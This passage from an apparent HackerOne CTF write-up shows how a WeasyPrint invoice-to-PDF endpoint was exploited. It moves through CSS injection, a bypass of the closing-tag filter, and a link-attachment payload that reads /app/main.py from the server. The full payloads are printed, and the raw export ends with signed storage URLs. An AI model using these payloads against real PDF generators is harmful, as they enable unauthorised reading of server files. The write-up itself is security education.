inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003ch2 id=\"stage-7-conversion\"\u003eStage 7 - Conversion\u003c/h2\u003e\n\n\u003cp\u003eBy inspecting the source code of the homepage, there was a commented out reference to \u003ccode\u003e/invoices/new\u003c/code\u003e.\u003cbr\u003e\nThat endpoint hosted a functionality that allowed unauthenticated users to generate HTML invoices and convert them to PDF files.\u003c/p\u003e\n\n\u003cp\u003eThe request to generate an HTML invoice looked like this:\u003c/p\u003e\n\n\u003cp\u003e\u003ccode\u003eGET /invoices/preview?d=%7B%22companyName%22%3A%22Acme%20Tools%22%2C%22email%22%3A%22accounting%40acme.com%22%2C%22invoiceNumber%22%3A%220001%22%2C%22date%22%3A%222019-04-01%22%2C%22items%22%3A%5B%5B%221%22%2C%22%22%2C%22%22%2C%2210%22%5D%5D%2C%22styles%22%3A%7B%22body%22%3A%7B%22background-color%22%3A%22white%22%7D%7D%7D\u003c/code\u003e\u003c/p\u003e\n\n\u003cp\u003eURL decoded:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight json\"\u003e\u003ccode\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;companyName\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;Acme Tools\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;email\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;accounting@acme.com\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;invoiceNumber\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;0001\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;date\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;2019-04-01\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;items\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:[[\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;1\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;10\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e]],\u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;styles\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:{\u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;body\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:{\u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;background-color\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;white\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e}}}\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe request to generate a PDF file from the HTML was the same and only the endpoint was different:\u003c/p\u003e\n\n\u003cp\u003e\u003ccode\u003eGET /invoices/pdfize?d=%7B%22companyName%22%3A%22Acme%20Tools%22%2C%22email%22%3A%22accounting%40acme.com%22%2C%22invoiceNumber%22%3A%220001%22%2C%22date%22%3A%222019-04-01%22%2C%22items%22%3A%5B%5B%221%22%2C%22%22%2C%22%22%2C%2210%22%5D%5D%2C%22styles%22%3A%7B%22body%22%3A%7B%22background-color%22%3A%22white%22%7D%7D%7D\u003c/code\u003e\u003c/p\u003e\n\n\u003cp\u003eI edited the \u003ccode\u003estyles\u003c/code\u003e JSON array to reference an external image with the \u003ccode\u003ebackground-image\u003c/code\u003e CSS property and successfully received an HTTP request coming from the server that was trying to fetch the image during the HTML to PDF conversion:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eUser-Agent: WeasyPrint 44 (http://weasyprint.org/)\nAccept: */*\nAccept-Encoding: gzip, deflate\nConnection: close\n\n104.196.12.98 - - [17/Mar/2019 18:52:30] \u0026quot;GET / HTTP/1.1\u0026quot; 200 -\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eSo, based on the user-agent, \u003ca href=\"/redirect?url=https%3A%2F%2Fweasyprint.org%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eWeasyPrint\u0026#39;s\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e rendering engine was used to convert HTML code to PDF files. It was also possible, with this CSS injection, to load local images hosted on the server by using the \u003ccode\u003efile:///\u003c/code\u003e scheme:\u003c/p\u003e\n\n\u003cp\u003e\u003ccode\u003efile:///usr/share/pixmaps/debian-logo.png\u003c/code\u003e\u003c/p\u003e\n\n\u003ch2 id=\"stage-8-filters-filters-and-more-filters\"\u003eStage 8 - Filters, filters and more filters\u003c/h2\u003e\n\n\u003cp\u003eAt this point, I wanted to inject iframe, object or embed attributes to load sensitive local files since the rendering was made server-side but all attempts were filtered by the application.\u003c/p\u003e\n\n\u003cp\u003eI remembered a \u003ca href=\"/redirect?url=https%3A%2F%2Fbuer.haus%2F2017%2F03%2F08%2Fairbnb-when-bypassing-json-encoding-xss-filter-waf-csp-and-auditor-turns-into-eight-vulnerabilities%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eblog post\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e where \u003ca href=\"/redirect?url=https%3A%2F%2Ftwitter.com%2Fbbuerhaus\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eZiot\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e and \u003ca href=\"/redirect?url=https%3A%2F%2Ftwitter.com%2FNahamSec\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eNahamSec\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e were able to bypass an XSS filter in a JSON object by prepending their payload with a semi-colon.\u003c/p\u003e\n\n\u003cp\u003eI used that idea to successfully inject \u003ccode\u003e\u0026lt;\u003c/code\u003e and \u003ccode\u003e\u0026gt;\u003c/code\u003e in the \u003ccode\u003estyles\u003c/code\u003e JSON array:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight json\"\u003e\u003ccode\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;companyName\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;test\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;email\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;test@test.com\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;invoiceNumber\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;001\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;date\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;items\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:[[\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;1\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;s\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;s\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;10\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e]],\u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;email\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;styles\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:{\u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;test\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:{\u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;;\u0026lt;\u0026gt;\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e}}}\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eI could inject \u003ccode\u003e\u0026lt;\u003c/code\u003e and \u003ccode\u003e\u0026gt;\u003c/code\u003e but I had to close out the \u003ccode\u003e\u0026lt;style\u0026gt;\u003c/code\u003e attribute before injecting other attributes. However, even though the filter was bypassed, a second filter was stripping out the following sequence:\u003c/p\u003e\n\n\u003cp\u003e\u003ccode\u003e\u0026lt;/anything_here\u0026gt;\u003c/code\u003e\u003c/p\u003e\n\n\u003cp\u003eA little bypass was required to fool the filter:\u003c/p\u003e\n\n\u003cp\u003e\u003ccode\u003e;\u0026lt;\\/\u0026lt;/s\u0026gt;style\u0026gt;\u003c/code\u003e\u003c/p\u003e\n\n\u003cp\u003eThe \u003ccode\u003e\u0026lt;/s\u0026gt;\u003c/code\u003e was stripped out and \u003ccode\u003e\u0026lt;/\u003c/code\u003e was joined with \u003ccode\u003estyle\u0026gt;\u003c/code\u003e to finally get \u003ccode\u003e\u0026lt;/style\u0026gt;\u003c/code\u003e:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight html\"\u003e\u003ccode\u003e  \u003cspan class=\"nt\"\u003e\u0026lt;style\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"o\"\u003e...\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003etest\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n      \u003cspan class=\"err\"\u003e:\u003c/span\u003e \u003cspan class=\"nt\"\u003e\u0026lt;/style\u0026gt;\u003c/span\u003e;\n    }\n    ...\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"stage-9-success\"\u003eStage 9 - Success!\u003c/h2\u003e\n\n\u003cp\u003eDespite the fact that I was able to inject \u003ccode\u003eiframe\u003c/code\u003e,\u003ccode\u003eembed\u003c/code\u003e and \u003ccode\u003eobject\u003c/code\u003e attributes, they were unfortunately not displaying the contents of internal files after the conversion.\u003c/p\u003e\n\n\u003cp\u003eAfter reading the \u003ca href=\"/redirect?url=https%3A%2F%2Fweasyprint.readthedocs.io%2Fen%2Fstable%2Findex.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eWeasyPrint documentation\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e and its source code on GitHub, I realized that it was also possible to include \u003ca href=\"/redirect?url=https%3A%2F%2Fdeveloper.mozilla.org%2Fen-US%2Fdocs%2FWeb%2FHTML%2FElement%2Flink\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eattachments\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e in PDF files and that WeasyPrint could process them:\u003c/p\u003e\n\n\u003cp\u003eSnippet of WeasyPrint\u0026#39;s \u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2FKozea%2FWeasyPrint%2Fblob%2Fmaster%2Fweasyprint%2Fhtml.py%23L318\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehtml.py\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight python\"\u003e\u003ccode\u003e\u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"nb\"\u003edict\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003etitle\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"n\"\u003etitle\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003edescription\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"n\"\u003edescription\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \n            \u003cspan class=\"n\"\u003egenerator\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"n\"\u003egenerator\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"n\"\u003ekeywords\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"n\"\u003ekeywords\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \n            \u003cspan class=\"n\"\u003eauthors\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"n\"\u003eauthors\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"n\"\u003ecreated\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"n\"\u003ecreated\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n            \u003cspan class=\"n\"\u003emodified\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"n\"\u003emodified\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"n\"\u003eattachments\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"n\"\u003eattachments\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eI remembered that the \u003cstrong\u003eFliteThermostat Admin\u003c/strong\u003e application\u0026#39;s files were located under the \u003ccode\u003e/app/\u003c/code\u003e directory. Following the same logic, I tried to extract the \u003ccode\u003e/app/main.py\u003c/code\u003e file from this host:\u003c/p\u003e\n\n\u003cp\u003e\u003ccode\u003eGET /invoices/pdfize?d=%7B%22companyName%22%3A%22%22%2C%22email%22%3A%22%22%2C%22invoiceNumber%22%3A%22%22%2C%22date%22%3A%22%22%2C%22items%22%3A%5B%5B%221%22%2C%22s%22%2C%22s%22%2C%2210%22%5D%5D%2C%22email%22%3A%22%22%2C%22styles%22%3A%7B%22test%22%3A%7B%22%3B%3C%5C%2F%3C%2Fs%3Estyle%3E%3Clink%20rel%3Dattachment%20href%3D%5C%22file%3A%2F%2F%2Fapp%2Fmain.py%5C%22%2F%3E%22%3A%22%22%7D%7D%7D\u003c/code\u003e\u003c/p\u003e\n\n\u003cp\u003eURL decoded:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight json\"\u003e\u003ccode\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;companyName\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;email\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;invoiceNumber\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;date\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;items\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:[[\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;1\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;s\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;s\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;10\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e]],\u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;email\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;styles\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:{\u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;test\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:{\u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;;\u0026lt;\\/\u0026lt;/s\u0026gt;style\u0026gt;\u0026lt;link rel=attachment href=\\\u0026quot;file:///app/main.py\\\u0026quot;/\u0026gt;\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e}}}\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe PDF\u0026#39;s size in the response was larger! I downloaded the PDF and extracted the attachment with binwalk:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight shell\"\u003e\u003ccode\u003ebinwalk \u003cspan class=\"nt\"\u003e-e\u003c/span\u003e document.pdf\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eOne of the extracted files contained the \u003ccode\u003emain.py\u003c/code\u003e script announcing the end of the road for the CTF with the winning string! \u003ccode\u003ec8889970d9fb722066f31e804e351993\u003c/code\u003e\u003c/p\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"congrats-ctf.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/450/900/e7b0e733a9a59d03501986219eab30e8411c018b/congrats-ctf.png?response-content-disposition=attachment%3B%20filename%3D%22congrats-ctf.png%22%3B%20filename%2A%3DUTF-8%27%27congrats-ctf.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ3VAHLH6Z%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T061325Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCD4BvSsKgWcuX7%2Fh3b1LWkKs9s4yRHAxqyVwXJYWsOAwIhANvLMyKSbceDyM1TNnWf11IvuT7a61DuFVJhD%2BT%2Fb9IrKrQDCFcQARoMMDEzNjE5Mjc0ODQ5Igxmi6woSxw%2B6wnwBEMqkQPI1uJcvWS%2B7FQadeW43PrlhsnF4xiGOroakbutVFcvcHOdYKgLxjIJI5m7XwadzbZWnWfHV0%2B62Zb%2BWCUOjMWiTVIXVX7AwYN1lfeKcXEYUp0h0oyXmZ8r9%2Bj%2FMZUagb%2BGKS%2B8zxvRdQjMX1tdjoDe9OxP6o1mlqEZpx8AKw7LDp1Hz2ezBoeya6X2GupABl%2FOhOfLY3VwJj7aPTg85UEwxOdZDtc%2FqzwALQiQUZo0A1RP3Y8nbzGb8CydaoFTXkp8rbJlMiimc%2BP%2BkZhbzJrdAs2rl68CFeUO2KSps4veGXWDFFoEAu1EvHwhAyOhkUlWXmX73VMyIVDvCkiHkuulKA8DiBfGp90UyI0AqLxJxXh%2FgCjGVxceHzAhM03UULwYdje89A1ziU5p%2BKL3KWD4xZiWFhlIiy3U92ksRt8S3l2NanthhEGEvTgf6wIclSsc9f4UbYnjYnAAiXkBg6iZTwORuQ0lVt30ma%2B%2BklzemkOgRIzghR66jzWcsjfvliY27ODm9Z12Vrj3LNetmm3XRTDEg6v%2FBTrqAb0W67QCovsIpNAiT4CujLyYV%2FjYmZ4VKcAok0lQwqZsNMCoze3egJJr5KwJfEhstOKt8adGE2Rfh5M%2BaAuxUHx9CHzHYR0HmUar1TnotcADpaizJlkcQmrsTfX3xtHVR8i9rhilHwmpYSeCQBjKHP%2BS656Uyq6ksGCrQWI4ZK%2F8QgDLIm%2FkIF6FlqRmaPtAeqfdwNxXQoCBcVLYgai%2FvmYu0CSd0Q1ngm%2FQMLqJqwYCLLmqTZrGYBRc5a553mtVqPYXlzc8Pgvjp59x%2Fjbix5wBt%2BoNg6EeSWNYAv4D0k4TzkJ4Aj8N%2BdAfag%3D%3D\u0026amp;X-Amz-Signature=5272cad8f5804d6e538087d281bb228fd0869e7833cf37cf9d84b8355a3be20a\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/450/900/e7b0e733a9a59d03501986219eab30e8411c018b/congrats-ctf.png?response-content-disposition=attachment%3B%20filename%3D%22congrats-ctf.png%22%3B%20filename%2A%3DUTF-8%27%27congrats-ctf.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ3VAHLH6Z%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T061325Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCD4BvSsKgWcuX7%2Fh3b1LWkKs9s4yRHAxqyVwXJYWsOAwIhANvLMyKSbceDyM1TNnWf11IvuT7a61DuFVJhD%2BT%2Fb9IrKrQDCFcQARoMMDEzNjE5Mjc0ODQ5Igxmi6woSxw%2B6wnwBEMqkQPI1uJcvWS%2B7FQadeW43PrlhsnF4xiGOroakbutVFcvcHOdYKgLxjIJI5m7XwadzbZWnWfHV0%2B62Zb%2BWCUOjMWiTVIXVX7AwYN1lfeKcXEYUp0h0oyXmZ8r9%2Bj%2FMZUagb%2BGKS%2B8zxvRdQjMX1tdjoDe9OxP6o1mlqEZpx8AKw7LDp1Hz2ezBoeya6X2GupABl%2FOhOfLY3VwJj7aPTg85UEwxOdZDtc%2FqzwALQiQUZo0A1RP3Y8nbzGb8CydaoFTXkp8rbJlMiimc%2BP%2BkZhbzJrdAs2rl68CFeUO2KSps4veGXWDFFoEAu1EvHwhAyOhkUlWXmX73VMyIVDvCkiHkuulKA8DiBfGp90UyI0AqLxJxXh%2FgCjGVxceHzAhM03UULwYdje89A1ziU5p%2BKL3KWD4xZiWFhlIiy3U92ksRt8S3l2NanthhEGEvTgf6wIclSsc9f4UbYnjYnAAiXkBg6iZTwORuQ0lVt30ma%2B%2BklzemkOgRIzghR66jzWcsjfvliY27ODm9Z12Vrj3LNetmm3XRTDEg6v%2FBTrqAb0W67QCovsIpNAiT4CujLyYV%2FjYmZ4VKcAok0lQwqZsNMCoze3egJJr5KwJfEhstOKt8adGE2Rfh5M%2BaAuxUHx9CHzHYR0HmUar1TnotcADpaizJlkcQmrsTfX3xtHVR8i9rhilHwmpYSeCQBjKHP%2BS656Uyq6ksGCrQWI4ZK%2F8QgDLIm%2FkIF6FlqRmaPtAeqfdwNxXQoCBcVLYgai%2FvmYu0CSd0Q1ngm%2FQMLqJqwYCLLmqTZrGYBRc5a553mtVqPYXlzc8Pgvjp59x%2Fjbix5wBt%2BoNg6EeSWNYAv4D0k4TzkJ4Aj8N%2BdAfag%3D%3D\u0026amp;X-Amz-Signature=5272cad8f5804d6e538087d281bb228fd0869e7833cf37cf9d84b8355a3be20a\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eThanks for reading! :)\u003c/p\u003e\n","original_report_id":null,"original_report_url":null,"attachments":[{"id":450897,"file_name":"Admin-2.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/450/897/aef1535c6701ef8a1462563eee78bedceeccf6c7/Admin-2.png?response-content-disposition=attachment%3B%20filename%3D%22Admin-2.png%22%3B%20filename%2A%3DUTF-8%27%27Admin-2.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ3VAHLH6Z%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T061325Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCD4BvSsKgWcuX7%2Fh3b1LWkKs9s4yRHAxqyVwXJYWsOAwIhANvLMyKSbceDyM1TNnWf11IvuT7a61DuFVJhD%2BT%2Fb9IrKrQDCFcQARoMMDEzNjE5Mjc0ODQ5Igxmi6woSxw%2B6wnwBEMqkQPI1uJcvWS%2B7FQadeW43PrlhsnF4xiGOroakbutVFcvcHOdYKgLxjIJI5m7XwadzbZWnWfHV0%2B62Zb%2BWCUOjMWiTVIXVX7AwYN1lfeKcXEYUp0h0oyXmZ8r9%2Bj%2FMZUagb%2BGKS%2B8zxvRdQjMX1tdjoDe9OxP6o1mlqEZpx8AKw7LDp1Hz2ezBoeya6X2GupABl%2FOhOfLY3VwJj7aPTg85UEwxOdZDtc%2FqzwALQiQUZo0A1RP3Y8nbzGb8CydaoFTXkp8rbJlMiimc%2BP%2BkZhbzJrdAs2rl68CFeUO2KSps4veGXWDFFoEAu1EvHwhAyOhkUlWXmX73VMyIVDvCkiHkuulKA8DiBfGp90UyI0AqLxJxXh%2FgCjGVxceHzAhM03UULwYdje89A1ziU5p%2BKL3KWD4xZiWFhlIiy3U92ksRt8S3l2NanthhEGEvTgf6wIclSsc9f4UbYnjYnAAiXkBg6iZTwORuQ0lVt30ma%2B%2BklzemkOgRIzghR66jzWcsjfvliY27ODm9Z12Vrj3LNetmm3XRTDEg6v%2FBTrqAb0W67QCovsIpNAiT4CujLyYV%2FjYmZ4VKcAok0lQwqZsNMCoze3egJJr5KwJfEhstOKt8adGE2Rfh5M%2BaAuxUHx9CHzHYR0HmUar1TnotcADpaizJlkcQmrsTfX3xtHVR8i9rhilHwmpYSeCQBjKHP%2BS656Uyq6ksGCrQWI4ZK%2F8QgDLIm%2FkIF6FlqRmaPtAeqfdwNxXQoCBcVLYgai%2FvmYu0CSd0Q1ngm%2FQMLqJqwYCLLmqTZrGYBRc5a553mtVqPYXlzc8Pgvjp59x%2Fjbix5wBt%2BoNg6EeSWNYAv4D0k4TzkJ4Aj8N%2BdAfag%3D%3D\u00